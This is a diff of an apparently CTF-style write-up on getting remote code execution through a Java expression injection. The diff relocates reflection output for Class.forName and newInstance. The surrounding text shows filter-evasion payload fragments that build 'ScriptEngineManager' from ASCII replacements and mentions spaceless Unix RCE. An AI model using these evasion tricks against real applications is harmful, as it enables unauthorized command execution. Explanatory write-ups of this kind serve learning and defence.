@@ -504,6 +504,13 @@ public class HelloWorld{
      }
 }
 ```
+output-
+```
+0 -> public static java.lang.Class java.lang.Class.forName(java.lang.String) throws java.lang.ClassNotFoundException
+...
+14 -> public java.lang.Object java.lang.Class.newInstance() throws java.lang.InstantiationException,java.lang.IllegalAccessException
+...
+```
 
 2. For Strings with uppercase letters, I though of various ways after going through all of the methods the `String` class gives and various Java gimmicks- 
     - `'aaa'.concat(B)` to append an ascii value or ascii value tyecasted to char
@@ -516,13 +523,7 @@ So, these expressions on my payload should start making sense-
 ```java
 'javax.script.1cript2ngine3anager'.replace('1', 83).replace('2', 69).replace('3', 77)
 ```
-output-
-```
-0 -> public static java.lang.Class java.lang.Class.forName(java.lang.String) throws java.lang.ClassNotFoundException
-...
-14 -> public java.lang.Object java.lang.Class.newInstance() throws java.lang.InstantiationException,java.lang.IllegalAccessException
-...
-```
+
 
 After getting `exec()` working I faced another blocker, `sh` doesn't give input redirection and piping, and `/bin/bash -c "command"` was rejecting spaces in the `command`. After some googling and struck [gold](http://zoczus.blogspot.com/2013/10/en-unix-rce-without-spaces.html).  
 ```bash
